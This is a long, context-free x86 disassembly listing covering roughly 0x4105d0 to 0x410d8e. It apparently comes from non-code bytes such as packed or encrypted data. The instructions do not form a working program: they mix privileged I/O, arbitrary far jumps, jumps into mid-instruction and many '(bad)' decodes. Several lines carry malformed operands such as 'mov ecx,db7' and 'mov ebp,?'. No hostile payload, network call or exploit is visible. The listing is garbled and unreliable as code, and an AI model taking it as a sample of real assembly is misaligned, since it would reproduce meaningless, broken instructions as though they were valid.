  4105d0:	test   eax,0xf972a713
  4105d5:	mov    bl,0x2d
  4105d7:	gs clc 
  4105d9:	outs   dx,BYTE PTR ds:[esi]
  4105da:	push   0x39eea31
  4105df:	inc    esi
  4105e0:	jmp    0x1d26:0x8ea7283b
  4105e7:	adc    ebp,DWORD PTR [ecx]
  4105e9:	xchg   ebp,eax
  4105ea:	mov    ah,0x3a
  4105ec:	or     eax,0x80896906
  4105f1:	pop    ecx
  4105f2:	xchg   edx,eax
  4105f3:	mov    edx,0xddb05e3
  4105f8:	repz test DWORD PTR [ebp+0x34],eax
  4105fc:	mov    ds,WORD PTR ds:0x3706bee7
  410602:	mov    edi,0x2d76ec9a
  410607:	sub    cl,BYTE PTR [ebx-0x18]
  41060a:	cli    
  41060b:	test   DWORD PTR [ecx-0x4c776ceb],esi
  410611:	xor    DWORD PTR [ebx+0x44],ecx
  410614:	bound  ecx,QWORD PTR [edx-0x68e7aa32]
  41061a:	das    
  41061b:	leave  
  41061c:	cmp    esp,edi
  41061e:	cdq    
  41061f:	xchg   ebx,eax
  410620:	inc    ebp
  410621:	shl    BYTE PTR [esi+0x4a6d8b6e],cl
  410627:	add    al,0x18
  410629:	push   edx
  41062a:	clc    
  41062b:	loope  0x410629
  41062d:	dec    ecx
  41062e:	sub    edx,DWORD PTR [eax-0x1f98e178]
  410634:	cmp    edi,DWORD PTR [ebx-0x1d9877e2]
  41063a:	or     eax,0x561e4861
  41063f:	ret    0x8882
  410642:	mov    ch,0x50
  410644:	iret   
  410645:	push   ebx
  410646:	mov    al,ds:0xb56d7835
  41064b:	dec    bp
  41064d:	sbb    eax,0x36ca81d7
  410652:	in     al,0x25
  410654:	loop   0x410652
  410656:	sbb    al,0x90
  410658:	cwde   
  410659:	(bad)
  41065c:	or     eax,0x7871ba9f
  410661:	or     ah,BYTE PTR [ecx+esi*2-0x7d]
  410665:	inc    eax
  410666:	cli    
  410667:	repz inc edi
  410669:	test   al,0x29
  41066b:	sub    eax,esp
  41066d:	jle    0x410680
  41066f:	push   cs
  410670:	pop    ebx
  410671:	and    esi,DWORD PTR [eax]
  410673:	les    ebx,FWORD PTR [ebx]
  410675:	dec    ebp
  410676:	or     eax,eax
  410678:	xor    BYTE PTR [ecx-0x7fa7b66c],cl
  41067e:	mov    ebp,0x1d956679
  410683:	fdiv   QWORD PTR [eax+0x613804dc]
  410689:	leave  
  41068a:	xchg   edx,eax
  41068b:	jl     0x4106da
  41068d:	cdq    
  41068e:	aam    0x41
  410690:	push   esp
  410691:	mov    esp,0x48bed818
  410696:	xchg   ah,ch
  410698:	inc    edi
  410699:	rcr    BYTE PTR [ebp-0xf93709c],1
  41069f:	loopne 0x4106f6
  4106a1:	jns    0x410671
  4106a3:	shl    ebx,1
  4106a5:	or     edx,ebx
  4106a7:	inc    esp
  4106a8:	push   ebp
  4106a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106aa:	test   al,0xeb
  4106ac:	sahf   
  4106ad:	dec    esi
  4106ae:	xor    esi,DWORD PTR [eax+0x2aec287a]
  4106b4:	jl     0x4106b0
  4106b6:	sub    BYTE PTR [edx],ah
  4106b8:	or     ecx,0x74
  4106bb:	and    al,0x44
  4106bd:	test   eax,eax
  4106bf:	gs add edx,esi
  4106c2:	mov    ch,0x1f
  4106c4:	sub    DWORD PTR [ebx],edi
  4106c6:	fisubr WORD PTR [ebx+0x1a460bdd]
  4106cc:	mov    ch,0xb0
  4106ce:	mov    bh,0x0
  4106d0:	arpl   WORD PTR [edi+0x1487e822],ax
  4106d6:	adc    DWORD PTR [ecx-0x522d86bb],0x4e
  4106dd:	push   edi
  4106de:	scas   eax,DWORD PTR es:[edi]
  4106df:	retf   
  4106e0:	or     ch,bl
  4106e2:	add    dh,al
  4106e4:	das    
  4106e5:	enter  0x2593,0xcc
  4106e9:	mov    bl,0xfe
  4106eb:	imul   ebp,DWORD PTR [esi],0x66
  4106ee:	and    BYTE PTR [esi+edi*4+0x21],dl
  4106f2:	xor    ebx,ebx
  4106f4:	pop    ecx
  4106f5:	in     al,dx
  4106f6:	or     DWORD PTR [ebx],ebp
  4106f8:	dec    ecx
  4106f9:	xor    BYTE PTR [ebp+0xe],al
  4106fc:	shl    dh,cl
  4106fe:	xor    BYTE PTR [eax+0x77],0xbb
  410702:	mov    ds:0xcfe883e0,eax
  410707:	mov    dl,0xd8
  410709:	out    0xd7,eax
  41070b:	pop    ds
  41070c:	lea    eax,ds:0x52762f99
  410712:	out    0x0,al
  410714:	sub    ebx,esp
  410716:	cmp    BYTE PTR [ebp+0x64],al
  410719:	hlt    
  41071a:	(bad)  
  41071b:	or     DWORD PTR [edi],ebp
  41071d:	stos   BYTE PTR es:[edi],al
  41071e:	push   ss
  41071f:	(bad)  
  410720:	pop    edi
  410721:	or     bl,BYTE PTR [esi]
  410723:	scas   eax,DWORD PTR es:[edi]
  410724:	xchg   edi,eax
  410725:	test   eax,0x85cf0562
  41072a:	lahf   
  41072b:	pop    esi
  41072c:	fisub  DWORD PTR ds:0xbc916c2e
  410732:	xchg   ecx,eax
  410733:	fs es mov cl,0xd
  410737:	and    eax,0x3342419e
  41073c:	outs   dx,DWORD PTR ds:[esi]
  41073d:	xchg   BYTE PTR [ecx],al
  41073f:	(bad)  
  410740:	ds cmc 
  410742:	jns    0x4107ae
  410744:	mov    ds:0x19856be4,al
  410749:	jno    0x410721
  41074b:	pop    eax
  41074c:	cmp    DWORD PTR [edi+0x2387e2cd],esi
  410752:	out    0xd6,al
  410754:	or     al,0x38
  410756:	jge    0x41077b
  410758:	out    dx,al
  410759:	nop
  41075a:	inc    eax
  41075b:	dec    ecx
  41075c:	aam    0xa0
  41075e:	push   es
  41075f:	lahf   
  410760:	test   BYTE PTR [edx],ah
  410762:	pop    ss
  410763:	inc    eax
  410764:	shr    ecx,1
  410766:	pop    esi
  410767:	into   
  410768:	dec    eax
  410769:	add    esi,DWORD PTR [ecx-0x4efafe67]
  41076f:	or     cl,BYTE PTR [esi-0x76dadfa6]
  410775:	loop   0x41078b
  410777:	in     eax,0x72
  410779:	or     eax,0x12aba256
  41077e:	fisub  WORD PTR gs:[eax]
  410781:	cwde   
  410782:	pop    eax
  410783:	adc    BYTE PTR [ebp+0x7588f2ac],0x17
  41078a:	hlt    
  41078b:	adc    ecx,DWORD PTR [edi+0x8]
  41078e:	cmp    eax,0x7ed002ed
  410793:	aas    
  410794:	pusha  
  410795:	mov    ds:0xb20f9435,al
  41079a:	fisttp DWORD PTR [edi+0x49e00ac9]
  4107a0:	inc    ecx
  4107a1:	cwde   
  4107a2:	(bad)  
  4107a4:	sbb    DWORD PTR [ebx],ebp
  4107a6:	aam    0x4c
  4107a8:	mov    ecx,db7
  4107ab:	(bad)  
  4107ac:	xor    eax,0x97a3b8d5
  4107b1:	je     0x410758
  4107b3:	bound  esi,QWORD PTR [edx-0x14d0fb2c]
  4107b9:	outs   dx,BYTE PTR ds:[esi]
  4107ba:	imul   edx,DWORD PTR [esi+0x45],0x4f
  4107be:	xchg   edx,eax
  4107bf:	nop
  4107c0:	ret    0x4c8
  4107c3:	(bad)  
  4107c4:	xor    bh,al
  4107c6:	inc    esi
  4107c7:	dec    esp
  4107c8:	cmp    esp,esp
  4107ca:	dec    ebx
  4107cb:	cmp    DWORD PTR ds:0xbe7f26aa,ebx
  4107d1:	sti    
  4107d2:	call   0xa65f:0x572d643c
  4107d9:	fwait
  4107da:	xor    ecx,edi
  4107dc:	nop
  4107dd:	and    dh,BYTE PTR [edi]
  4107df:	test   DWORD PTR [ecx],ecx
  4107e1:	fdiv   DWORD PTR [ebx]
  4107e3:	add    eax,eax
  4107e5:	push   cs
  4107e6:	std    
  4107e7:	cdq    
  4107e8:	out    0xb5,al
  4107ea:	sub    ecx,DWORD PTR [esi-0x49]
  4107ed:	mov    DWORD PTR [eax+0x72cbdc97],esi
  4107f3:	popa   
  4107f4:	(bad)
  4107f7:	or     eax,0xa7ec4423
  4107fc:	inc    esi
  4107fd:	push   0xe4ecb9cc
  410802:	pop    es
  410803:	ficom  DWORD PTR [eax+0x69599e4f]
  410809:	aaa    
  41080a:	mov    edx,0x3c785c36
  41080f:	push   ebx
  410810:	push   ebx
  410811:	int3   
  410812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410813:	repnz pusha 
  410815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410816:	xchg   esp,eax
  410817:	or     al,0xef
  410819:	sbb    esi,DWORD PTR [ebx]
  41081b:	in     al,0x17
  41081d:	xchg   DWORD PTR [eax-0x14632d90],ebx
  410823:	push   es
  410824:	rcl    BYTE PTR [ebx],1
  410826:	jae    0x410863
  410828:	and    al,0xa6
  41082a:	jmp    0xb0d6:0xea5c8ac
  410831:	jae    0x4107e1
  410833:	aaa    
  410834:	cdq    
  410835:	loope  0x41087c
  410837:	in     eax,dx
  410838:	jbe    0x41086b
  41083a:	cmp    al,0x52
  41083c:	ss mov edi,0x1fa1272
  410842:	enter  0x4d7f,0x7e
  410846:	mov    ds:0x767f2376,eax
  41084b:	inc    edx
  41084c:	adc    BYTE PTR [esi+0x48],0xa4
  410850:	fs pop esp
  410852:	fsub   QWORD PTR [esi+ebx*1-0x6577da20]
  410859:	je     0x4108d8
  41085b:	mov    al,BYTE PTR [ebx+0x6cff021b]
  410861:	pop    ecx
  410862:	call   0x6f77c023
  410867:	dec    ecx
  410868:	into   
  410869:	nop
  41086a:	fcomp  st(5)
  41086c:	test   al,0xb0
  41086e:	stos   BYTE PTR es:[edi],al
  41086f:	shl    DWORD PTR [ecx+0x729f3865],1
  410875:	jmp    0x41087b
  410877:	cwde   
  410878:	in     eax,0x80
  41087a:	hlt    
  41087b:	cli    
  41087c:	sub    eax,0x8f52af81
  410881:	mov    ah,bl
  410883:	jl     0x410808
  410885:	pushf  
  410886:	mov    ds:0x4605364b,al
  41088b:	stc    
  41088c:	das    
  41088d:	lahf   
  41088e:	mov    ds:0xb7dec33a,al
  410893:	adc    al,BYTE PTR [ebx+0x43]
  410896:	and    al,0xfc
  410898:	jne    0x410918
  41089a:	add    esi,ecx
  41089c:	fist   DWORD PTR [ebx-0xec13f13]
  4108a2:	ret    0x8823
  4108a5:	and    edi,DWORD PTR [edi]
  4108a7:	bnd jno 0x410893
  4108aa:	and    dl,BYTE PTR [ecx-0x79]
  4108ad:	mov    al,0x81
  4108af:	aas    
  4108b0:	jns    0x4108bd
  4108b2:	mov    cl,0x82
  4108b4:	sar    ebx,cl
  4108b6:	push   esi
  4108b7:	ins    BYTE PTR es:[edi],dx
  4108b8:	test   al,0x8a
  4108ba:	add    edx,DWORD PTR [eax]
  4108bc:	cmp    DWORD PTR [ebx-0x422a5e7f],esi
  4108c2:	xor    BYTE PTR [eax],0x34
  4108c5:	call   0x491a:0xab301bdc
  4108cc:	or     DWORD PTR [ebx-0x72],esp
  4108cf:	(bad)  
  4108d0:	or     BYTE PTR [esi+0x44],dh
  4108d3:	stos   BYTE PTR es:[edi],al
  4108d4:	popf   
  4108d5:	pop    esp
  4108d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108d7:	cmp    DWORD PTR [ebx],ebp
  4108d9:	mov    ebx,0x1637ec45
  4108de:	xor    al,0xca
  4108e0:	fisttp WORD PTR [ebp-0x3cf6ce22]
  4108e6:	popa   
  4108e7:	fidivr WORD PTR [eax-0x7d]
  4108ea:	in     eax,0x97
  4108ec:	outs   dx,DWORD PTR ds:[esi]
  4108ed:	sahf   
  4108ee:	clc    
  4108ef:	lds    ebx,FWORD PTR [edi+0x75]
  4108f2:	adc    al,0x84
  4108f4:	popf   
  4108f5:	inc    edx
  4108f6:	and    dh,dl
  4108f8:	stc    
  4108f9:	push   ds
  4108fa:	call   0x9162:0xf0803e8b
  410901:	lods   al,BYTE PTR ds:[esi]
  410902:	xchg   dx,ax
  410904:	sbb    al,0xf9
  410906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410907:	jp     0x4108d4
  410909:	gs ja  0x410950
  41090c:	cmp    eax,0x7639cb41
  410911:	inc    ecx
  410912:	fcom   DWORD PTR [ebp-0x29]
  410915:	sub    BYTE PTR [ebp-0x5cde2219],al
  41091b:	hlt    
  41091c:	mov    bh,cl
  41091e:	xchg   BYTE PTR [edx+0x382a7f80],dh
  410924:	xchg   esi,eax
  410925:	adc    BYTE PTR [eax],dh
  410927:	mov    eax,0xbd9d0ceb
  41092c:	retf   0x8f85
  41092f:	js     0x410983
  410931:	mov    ds:0xf2c6d3bb,eax
  410936:	adc    edx,esi
  410938:	dec    eax
  410939:	and    BYTE PTR [ecx+esi*2+0x22857c54],al
  410940:	repz cwde 
  410942:	xchg   BYTE PTR es:[ebx+0x2a],ah
  410946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410947:	fadd   QWORD PTR [ebx-0x17]
  41094a:	outs   dx,BYTE PTR ds:[esi]
  41094b:	push   edx
  41094c:	mov    esp,0x2362cded
  410951:	stc    
  410952:	cmp    DWORD PTR ds:0x91913925,0xe0abfbd3
  41095c:	mul    DWORD PTR [ecx-0x52]
  41095f:	sub    al,0x23
  410961:	fwait
  410962:	or     DWORD PTR [esi],ebp
  410964:	jl     0x410997
  410966:	push   edx
  410967:	(bad)  
  410968:	sbb    ebp,DWORD PTR [ebp+0x23]
  41096b:	mov    ebx,0xe81a3f25
  410970:	mov    dl,0xed
  410972:	mov    ecx,0xa3620f7f
  410977:	add    ebx,DWORD PTR [edx-0x5d]
  41097a:	std    
  41097b:	sub    eax,0x1cb0a0bb
  410980:	test   eax,0xf4c4a71c
  410985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410986:	cmp    eax,0x5f36fa3b
  41098b:	neg    BYTE PTR [edi-0x62]
  41098e:	xor    DWORD PTR [edi+ebx*1],esi
  410991:	cmp    ebp,DWORD PTR [esp+ebx*8]
  410994:	push   ecx
  410995:	es mov esi,0xebbb08ae
  41099b:	pop    edi
  41099c:	inc    esi
  41099d:	adc    ebp,DWORD PTR [ecx-0x3d074e5f]
  4109a3:	and    DWORD PTR [edx+edx*2],esp
  4109a6:	jge    0x410a02
  4109a8:	mov    edx,0x99521179
  4109ad:	dec    esi
  4109ae:	jmp    0x410941
  4109b0:	rcr    BYTE PTR [ecx+0x592d2404],0x58
  4109b7:	shl    BYTE PTR [ecx],1
  4109b9:	mov    cl,0xa4
  4109bb:	inc    edi
  4109bc:	inc    eax
  4109bd:	sbb    eax,0xdb09f06f
  4109c2:	pop    ds
  4109c3:	into   
  4109c4:	fmul   DWORD PTR [edi]
  4109c6:	test   BYTE PTR [ebx-0x49],ah
  4109c9:	and    ecx,ebp
  4109cb:	inc    ebx
  4109cc:	mov    bl,0x68
  4109ce:	fcom   DWORD PTR [ebp-0x32]
  4109d1:	mov    ch,BYTE PTR [ecx]
  4109d3:	jg     0x4109d6
  4109d5:	inc    ebp
  4109d6:	jmp    DWORD PTR [ebp+0x5ea5ef55]
  4109dc:	or     ebx,DWORD PTR [esi]
  4109de:	or     dh,BYTE PTR [ebp+0x4063ae3e]
  4109e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109e5:	mov    esi,DWORD PTR [esi-0x70]
  4109e8:	jmp    0x410a49
  4109ea:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109ec:	or     ah,BYTE PTR [ebp-0x57]
  4109ef:	icebp  
  4109f0:	out    0x27,eax
  4109f2:	fisttp QWORD PTR [eax-0x76]
  4109f5:	dec    esi
  4109f6:	xchg   ebp,eax
  4109f7:	mov    ebx,0x81462679
  4109fc:	ins    DWORD PTR es:[edi],dx
  4109fd:	mov    ebp,?
  4109ff:	fadd   st,st(6)
  410a01:	in     al,dx
  410a02:	push   0xffffff94
  410a04:	add    bl,BYTE PTR [esi]
  410a06:	(bad)  
  410a08:	(bad)  
  410a09:	xlat   BYTE PTR ds:[ebx]
  410a0a:	in     al,dx
  410a0b:	sbb    ecx,DWORD PTR [edx]
  410a0d:	dec    ebp
  410a0e:	sub    al,0x55
  410a10:	and    eax,0x10dc6bf4
  410a15:	mov    eax,0x6d3450c8
  410a1a:	push   edi
  410a1b:	push   es
  410a1c:	push   esp
  410a1d:	mov    bl,0xdf
  410a1f:	adc    al,0xc7
  410a21:	cmp    DWORD PTR [esi+0x372d4798],0x7b
  410a28:	cmc    
  410a29:	mov    ebx,0x23761f61
  410a2e:	add    edi,ebp
  410a30:	(bad)  
  410a31:	fbld   TBYTE PTR [ecx]
  410a33:	jmp    0x24e3:0xe394b50a
  410a3a:	adc    eax,0x62a1873f
  410a3f:	push   0x3f2ee670
  410a44:	pop    es
  410a45:	cmp    eax,0xc0a91ada
  410a4a:	push   ss
  410a4b:	fucompp 
  410a4d:	pop    edi
  410a4e:	dec    ecx
  410a4f:	repnz (bad) 
  410a51:	test   eax,0xdde8ff7e
  410a56:	das    
  410a57:	ror    BYTE PTR [eax+0x257cf0a0],1
  410a5d:	mov    bh,0x57
  410a5f:	cdq    
  410a60:	aas    
  410a61:	adc    eax,edx
  410a63:	inc    eax
  410a64:	pop    ecx
  410a65:	adc    BYTE PTR [eax],0xc0
  410a68:	enter  0xa75,0xba
  410a6c:	jne    0x410a88
  410a6e:	sub    DWORD PTR [esp+eax*1],eax
  410a71:	mov    ch,0x80
  410a73:	and    al,0xe3
  410a75:	mov    ds:0x2fe08930,eax
  410a7a:	dec    edx
  410a7b:	or     al,0x95
  410a7d:	loope  0x410a70
  410a7f:	rol    cl,0x6
  410a82:	mov    ds:0xd5463ed4,eax
  410a87:	xor    al,0xe6
  410a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a8a:	out    dx,al
  410a8b:	lods   eax,DWORD PTR ds:[esi]
  410a8c:	sbb    dl,BYTE PTR ds:0x9e8674b
  410a92:	(bad)  
  410a93:	push   ecx
  410a94:	xor    eax,DWORD PTR [ebp-0x22]
  410a97:	(bad)  
  410a98:	pop    ecx
  410a99:	jp     0x410a55
  410a9b:	adc    al,dh
  410a9d:	lds    esp,FWORD PTR [ebx+ecx*1-0x5b2b04bf]
  410aa4:	push   es
  410aa5:	daa    
  410aa6:	cmp    al,0x9c
  410aa8:	adc    dl,0x2
  410aab:	nop
  410aac:	sbb    eax,0xabaf2843
  410ab1:	jmp    0xabb843c3
  410ab6:	outs   dx,BYTE PTR ds:[esi]
  410ab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ab8:	add    DWORD PTR [edx+0x37],ebx
  410abb:	cs mov cx,0xec62
  410ac0:	dec    edx
  410ac1:	mov    eax,ss:0xd54ff418
  410ac7:	imul   ecx,DWORD PTR [edi+0x5e85768a],0x95bb55e6
  410ad1:	sar    DWORD PTR [eax+0x18],1
  410ad4:	shr    esi,cl
  410ad6:	iret   
  410ad7:	pop    edx
  410ad8:	sahf   
  410ad9:	add    al,0xe6
  410adc:	aam    0xbd
  410ade:	popf   
  410adf:	(bad)  
  410ae0:	and    eax,0xa75e945e
  410ae5:	pop    edi
  410ae6:	sti    
  410ae7:	push   edi
  410ae8:	imul   edi,DWORD PTR [edi-0x106850e6],0x3a3432f
  410af2:	scas   eax,DWORD PTR es:[edi]
  410af3:	mul    DWORD PTR [ebp+0x2b]
  410af6:	ins    DWORD PTR es:[edi],dx
  410af7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af8:	das    
  410af9:	and    al,0xd6
  410afb:	and    BYTE PTR [edx+esi*8],dl
  410afe:	aam    0xfd
  410b00:	push   ecx
  410b01:	int3   
  410b02:	push   0xffffffcb
  410b04:	test   cl,0xe9
  410b07:	shl    BYTE PTR [eax-0x1c5fd4b8],0xff
  410b0e:	lods   eax,DWORD PTR ds:[esi]
  410b0f:	fsubp  st(5),st
  410b11:	mov    esi,0xf4f44fbf
  410b16:	jecxz  0x410b61
  410b18:	and    eax,0xa9589770
  410b1d:	fmul   DWORD PTR [ecx+edx*4+0x35]
  410b21:	add    ebx,esi
  410b23:	fwait
  410b24:	test   DWORD PTR [edx+0x31],eax
  410b27:	pop    ecx
  410b28:	dec    ebx
  410b29:	sbb    eax,eax
  410b2b:	clc    
  410b2c:	enter  0x24e0,0xc8
  410b30:	cmp    al,0x90
  410b32:	and    BYTE PTR [edx+esi*1+0x3a6dfbda],bh
  410b39:	mov    dh,0x8a
  410b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b3c:	sub    DWORD PTR [esi],esp
  410b3e:	sti    
  410b3f:	fbld   TBYTE PTR [ebx+0x1af76a54]
  410b45:	jbe    0x410bbe
  410b47:	add    al,0x12
  410b49:	jge    0x410b7a
  410b4b:	orps   xmm6,XMMWORD PTR [eax-0x2a]
  410b4f:	mov    dh,0xac
  410b51:	sahf   
  410b52:	push   es
  410b53:	cmp    al,0xe2
  410b55:	sub    cl,BYTE PTR [edi+0x1f]
  410b58:	adc    dl,BYTE PTR [edx+eax*8]
  410b5b:	test   al,0xc7
  410b5d:	std    
  410b5e:	outs   dx,DWORD PTR ds:[esi]
  410b5f:	cs xchg ebx,eax
  410b61:	out    0xaf,al
  410b63:	push   es
  410b64:	fwait
  410b65:	cdq    
  410b66:	repnz push eax
  410b68:	dec    ecx
  410b69:	xor    ah,0xdf
  410b6c:	(bad)  
  410b6d:	into   
  410b6e:	sbb    ah,dl
  410b70:	mov    bl,0xb8
  410b72:	clc    
  410b73:	les    edi,FWORD PTR [ecx-0x7]
  410b76:	outs   dx,BYTE PTR ds:[esi]
  410b77:	into   
  410b78:	retf   
  410b79:	dec    edx
  410b7a:	mov    ch,al
  410b7c:	mov    eax,edx
  410b7e:	clc    
  410b7f:	mov    al,ds:0x39e186fb
  410b84:	aas    
  410b85:	enter  0xd864,0x3d
  410b89:	xlat   BYTE PTR ds:[ebx]
  410b8a:	das    
  410b8b:	(bad)  
  410b8d:	jmp    0x410b33
  410b8f:	iret   
  410b90:	das    
  410b91:	sbb    ebp,DWORD PTR [edx-0x50]
  410b94:	aam    0x5b
  410b96:	sub    eax,0xd771bdb1
  410b9b:	imul   esi,DWORD PTR [ebp+0x6e4109e6],0x81953aa7
  410ba5:	out    dx,al
  410ba6:	cmp    eax,ebx
  410ba8:	mov    ds:0x392fe784,al
  410bad:	mov    al,0x7c
  410baf:	clc    
  410bb0:	inc    edi
  410bb1:	ins    DWORD PTR es:[edi],dx
  410bb2:	pop    es
  410bb3:	loope  0x410b73
  410bb5:	sub    dl,0xcd
  410bb8:	pop    ebp
  410bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bba:	xor    DWORD PTR [ebp-0x1d],0x1e4ccce3
  410bc1:	ret    0xc2d5
  410bc4:	les    ecx,FWORD PTR [esi+0x7888bd12]
  410bca:	lahf   
  410bcb:	rcr    BYTE PTR [edx-0x6a],1
  410bce:	jp     0x410bcb
  410bd0:	sbb    ah,BYTE PTR [ebp+0x56f73846]
  410bd6:	mov    edx,0xf5dfc365
  410bdb:	leave  
  410bdc:	in     eax,0x5e
  410bde:	jne    0x410b69
  410be0:	jb     0x410c60
  410be2:	jg     0x410bb0
  410be4:	fstp   TBYTE PTR [eax-0x73]
  410be7:	outs   dx,DWORD PTR ds:[esi]
  410be8:	mov    dh,0x76
  410bea:	and    eax,0x48c3adc4
  410bef:	push   ebp
  410bf0:	in     eax,dx
  410bf1:	jns    0x410c5c
  410bf3:	mov    DWORD PTR [eax+edi*1+0x200b5f07],0x35dddea5
  410bfe:	mov    ?,WORD PTR ds:0x11039515
  410c04:	out    0x2c,al
  410c06:	mov    ch,0x3f
  410c08:	sub    DWORD PTR [edx+0x152f71fe],ecx
  410c0e:	xchg   edx,eax
  410c0f:	iret   
  410c10:	pop    es
  410c11:	ret    0xa272
  410c14:	pop    ebp
  410c15:	imul   ebx,DWORD PTR [edx+0x76],0xb558a469
  410c1c:	dec    ebx
  410c1d:	outs   dx,BYTE PTR ds:[esi]
  410c1e:	jecxz  0x410bc6
  410c20:	jno    0x410c67
  410c22:	or     edi,DWORD PTR [ebx+0x2e]
  410c25:	and    BYTE PTR [ecx],al
  410c27:	jnp    0x410c01
  410c29:	sti    
  410c2a:	mov    esi,0x10155502
  410c2f:	add    BYTE PTR [edi-0x50bbcbcc],dl
  410c35:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  410c37:	mov    cs,WORD PTR [edx+esi*2-0x6e]
  410c3b:	dec    ebp
  410c3c:	loope  0x410bf0
  410c3e:	aad    0x57
  410c40:	xchg   ecx,ebx
  410c42:	repz std 
  410c44:	cmp    eax,0x56ce50bc
  410c49:	inc    ebx
  410c4a:	std    
  410c4b:	stos   DWORD PTR es:[edi],eax
  410c4c:	mov    al,0x91
  410c4e:	cmp    al,0xe4
  410c50:	cmovne ebp,DWORD PTR [eax-0x5d221877]
  410c57:	cmp    ebx,edx
  410c59:	jns    0x410bf6
  410c5b:	je     0x410ca1
  410c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c5e:	mov    eax,ds:0xc361f22c
  410c63:	shl    DWORD PTR [edi+0x1f],0x27
  410c67:	pushf  
  410c68:	cwde   
  410c69:	xor    ecx,DWORD PTR [esi-0x57]
  410c6c:	push   eax
  410c6d:	cdq    
  410c6e:	cld    
  410c6f:	lods   eax,DWORD PTR ds:[esi]
  410c70:	mov    DWORD PTR [edx+ebx*8+0x38],ecx
  410c74:	mov    ebp,0x3b7f9610
  410c79:	xchg   esp,eax
  410c7a:	dec    eax
  410c7b:	adc    esi,edi
  410c7d:	gs fdivrp st(5),st
  410c80:	in     eax,0x7f
  410c82:	mov    esi,0x3265338c
  410c87:	test   al,0xe8
  410c89:	mov    ch,0x98
  410c8b:	pop    esi
  410c8c:	(bad)  
  410c8d:	aaa    
  410c8e:	loop   0x410ca7
  410c90:	dec    ebp
  410c91:	mov    cl,0x8e
  410c93:	sub    eax,0xbc4bd29a
  410c98:	inc    esi
  410c99:	cmp    DWORD PTR ds:0xb40d8b98,ecx
  410c9f:	rcl    BYTE PTR [esi+0x3903b78c],cl
  410ca5:	sub    al,0x3c
  410ca7:	(bad)  
  410ca8:	pop    ss
  410ca9:	add    eax,0xf5ad806d
  410cae:	inc    ecx
  410caf:	leave  
  410cb0:	jg     0x410c58
  410cb2:	dec    edi
  410cb3:	xchg   ecx,edi
  410cb5:	out    dx,al
  410cb6:	jge    0x410c4d
  410cb8:	mov    al,0x9b
  410cba:	jmp    FWORD PTR [ebx]
  410cbc:	push   ecx
  410cbd:	inc    ecx
  410cbe:	stos   BYTE PTR es:[edi],al
  410cbf:	out    dx,al
  410cc0:	xor    ebx,ebp
  410cc2:	aaa    
  410cc3:	test   ecx,esp
  410cc5:	mov    ebx,0xb88ba8b1
  410cca:	mov    ds:0xa04109e5,al
  410ccf:	jbe    0x410d0c
  410cd1:	sahf   
  410cd2:	rol    BYTE PTR [edx+0x29],0x22
  410cd6:	pusha  
  410cd7:	inc    edx
  410cd8:	aaa    
  410cd9:	fsub   QWORD PTR [esi]
  410cdb:	mov    eax,0x9ded1f1
  410ce0:	adc    ecx,esp
  410ce2:	sbb    DWORD PTR [ebx+edi*2-0x387a9d97],ebx
  410ce9:	je     0x410ce7
  410ceb:	xor    BYTE PTR [ebx-0x3c6616bc],ch
  410cf1:	pop    ebp
  410cf2:	jo     0x410cc1
  410cf4:	inc    ebp
  410cf5:	push   0xd87a0706
  410cfa:	loopne 0x410cad
  410cfc:	test   eax,0x54cbf1a
  410d01:	mov    bh,0x49
  410d03:	iret   
  410d04:	jmp    0x1624c564
  410d09:	adc    eax,0xda973326
  410d0e:	inc    esi
  410d0f:	xor    BYTE PTR [esi-0x72bfc150],cl
  410d15:	mov    cs,WORD PTR [esi-0x742ccc77]
  410d1b:	sub    ecx,DWORD PTR [ecx+0x5a]
  410d1e:	xchg   edi,eax
  410d1f:	push   eax
  410d20:	push   eax
  410d21:	cmp    al,BYTE PTR [esi-0x2b]
  410d24:	sbb    esp,eax
  410d26:	push   ss
  410d27:	jns    0x410d7c
  410d29:	sbb    al,0xd6
  410d2b:	and    ch,BYTE PTR [ebp-0x452b583]
  410d31:	sub    DWORD PTR [ebx+esi*2],ebp
  410d34:	lods   al,BYTE PTR ds:[esi]
  410d35:	dec    ecx
  410d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d37:	and    ebx,esp
  410d39:	lock gs imul ebx,ebx,0xd056df19
  410d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d42:	out    0xed,al
  410d44:	sbb    al,0x8c
  410d46:	pusha  
  410d47:	fsubrp st(1),st
  410d49:	bound  esp,QWORD PTR [eax-0x53]
  410d4c:	xchg   ebx,eax
  410d4d:	pop    ebp
  410d4e:	cli    
  410d4f:	or     BYTE PTR [eax+ecx*1-0x36966706],0x6c
  410d57:	(bad)  
  410d58:	cs sub eax,0x49c1dfc0
  410d5e:	push   esp
  410d5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d60:	jg     0x410d23
  410d62:	push   esi
  410d63:	mov    ebx,0x44349c97
  410d68:	mov    bl,0x1d
  410d6a:	inc    eax
  410d6b:	mov    edi,0x3a2cc402
  410d70:	xlat   BYTE PTR ds:[ebx]
  410d71:	cmp    BYTE PTR [ebp-0x79],0xbc
  410d75:	leave  
  410d76:	mov    eax,0x2d25db66
  410d7b:	(bad)  
  410d7c:	leave  
  410d7d:	clc    
  410d7e:	sbb    ebp,DWORD PTR [edi-0x7c0cb8ca]
  410d84:	std    
  410d85:	jae    0x410de1
  410d87:	jp     0x410de0
  410d89:	dec    edx
  410d8a:	xchg   BYTE PTR [eax],bh
  410d8c:	push   edx
  410d8d:	inc    ecx
  410d8e:	jno    0x410dce
